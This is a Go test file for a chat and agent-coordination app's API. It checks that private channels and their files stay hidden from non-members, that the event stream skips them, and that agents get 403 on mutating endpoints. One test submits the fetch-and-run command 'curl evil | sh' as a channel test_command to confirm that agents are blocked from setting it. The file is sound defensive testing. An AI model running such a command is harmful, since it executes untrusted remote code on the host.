package api

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gorilla/websocket"

	"github.com/thiagodefreitas/faztudo/internal/domain"
	"github.com/thiagodefreitas/faztudo/internal/events"
	"github.com/thiagodefreitas/faztudo/internal/store"
)

// privateRoom adds a private channel the fixture's human is not in, with a
// message that attaches an uploaded file.
func privateRoom(t *testing.T, f *threadFixture) (domain.Channel, domain.Attachment) {
	t.Helper()
	ctx := context.Background()
	other := domain.Member{ID: store.NewID(), Kind: domain.MemberHuman, Handle: "other", DisplayName: "Other"}
	room := domain.Channel{ID: store.NewID(), Name: "secret-room", Kind: domain.ChannelTeam, Visibility: domain.VisibilityPrivate, MemberIDs: []string{other.ID}}
	var att domain.Attachment
	rec := f.upload(t, "file", "plan.pdf", []byte("%PDF-1.4 private plan"))
	if err := json.Unmarshal(rec.Body.Bytes(), &att); err != nil {
		t.Fatal(err)
	}
	for _, d := range []events.Draft{
		{Type: events.MemberUpdated, Actor: events.System, Payload: other},
		{Type: events.ChannelCreated, Actor: events.System, ChannelID: room.ID, Payload: room},
		{Type: events.MessagePosted, Actor: events.Human(other.ID), ChannelID: room.ID, Payload: domain.Message{ID: store.NewID(), ChannelID: room.ID, AuthorID: other.ID, Body: "private", Attachments: []domain.Attachment{att}}},
	} {
		if _, err := f.h.Store.Append(ctx, d); err != nil {
			t.Fatal(err)
		}
	}
	return room, att
}

func TestPrivateChannelIsHiddenFromNonMembers(t *testing.T) {
	f := newThreadFixture(t)
	f.withFiles(t, 0)
	room, att := privateRoom(t, f)

	var list []domain.Channel
	f.do(t, "GET", "/api/v1/channels", "", 200, &list)
	for _, c := range list {
		if c.ID == room.ID {
			t.Fatalf("private channel listed: %+v", c)
		}
	}
	if len(list) != 3 {
		t.Fatalf("visible channels = %d, want 3", len(list))
	}
	f.do(t, "GET", "/api/v1/channels/"+room.ID+"/messages", "", 404, nil)
	f.do(t, "GET", "/api/v1/channels/"+room.ID+"/pins", "", 404, nil)
	f.do(t, "PATCH", "/api/v1/channels/"+room.ID, `{"topic":"mine now"}`, 404, nil)
	if rec := f.get(t, "/api/v1/files/"+att.ID); rec.Code != 404 {
		t.Fatalf("private file status %d, want 404", rec.Code)
	}

	// Once a channel the caller can read names the same file, it is served.
	var msg domain.Message
	f.do(t, "POST", "/api/v1/channels/"+f.team.ID+"/messages", `{"body":"","attachments":[{"id":"`+att.ID+`","name":"plan.pdf"}]}`, 201, &msg)
	if rec := f.get(t, "/api/v1/files/"+att.ID); rec.Code != 200 {
		t.Fatalf("shared file status %d, want 200", rec.Code)
	}
}

func TestStreamSkipsEventsOfPrivateChannels(t *testing.T) {
	f := newThreadFixture(t)
	f.withFiles(t, 0)
	room, _ := privateRoom(t, f)
	srv := httptest.NewServer(f.h)
	defer srv.Close()
	ws, _, err := websocket.DefaultDialer.Dial("ws"+srv.URL[4:]+"/api/v1/stream", nil)
	if err != nil {
		t.Fatal(err)
	}
	defer ws.Close()
	if err = ws.WriteMessage(websocket.TextMessage, []byte(`{"op":"subscribe","after_seq":0}`)); err != nil {
		t.Fatal(err)
	}
	marker := domain.Message{ID: store.NewID(), ChannelID: f.team.ID, AuthorID: f.human.ID, Body: "marker"}
	if _, err = f.h.Store.Append(context.Background(), events.Draft{Type: events.MessagePosted, Actor: events.Human(f.human.ID), ChannelID: f.team.ID, Payload: marker}); err != nil {
		t.Fatal(err)
	}
	_ = ws.SetReadDeadline(time.Now().Add(5 * time.Second))
	for {
		_, b, err := ws.ReadMessage()
		if err != nil {
			t.Fatalf("marker never arrived: %v", err)
		}
		var evt events.Event
		if err = json.Unmarshal(b, &evt); err != nil {
			t.Fatal(err)
		}
		if evt.ChannelID == room.ID {
			t.Fatalf("event of a private channel reached the stream: %s", b)
		}
		if evt.ChannelID == f.team.ID && strings.Contains(string(evt.Payload), "marker") {
			return
		}
	}
}

func TestMutatingEndpointsAreHumanOnly(t *testing.T) {
	f := newThreadFixture(t)
	f.withFiles(t, 0)
	f.h.actorForRequest = func(*http.Request) (domain.Member, error) { return f.coder, nil }
	f.do(t, "PATCH", "/api/v1/lanes/codex/default", `{"capacity":3}`, 403, nil)
	f.do(t, "POST", "/api/v1/lanes/codex/default/probe", "", 403, nil)
	f.do(t, "POST", "/api/v1/channels", `{"name":"agent-made"}`, 403, nil)
	f.do(t, "PATCH", "/api/v1/channels/"+f.team.ID, `{"test_command":"curl evil | sh"}`, 403, nil)
	f.do(t, "POST", "/api/v1/runs/r1/cancel", "", 403, nil)
	f.do(t, "POST", "/api/v1/runs/r1/retry", `{}`, 403, nil)
	if rec := f.upload(t, "file", "a.txt", []byte("x")); rec.Code != 403 {
		t.Fatalf("agent upload status %d, want 403", rec.Code)
	}
	f.h.actorForRequest = nil
	if rec := f.upload(t, "file", "a.txt", []byte("x")); rec.Code != 201 {
		t.Fatalf("human upload status %d, want 201", rec.Code)
	}
}
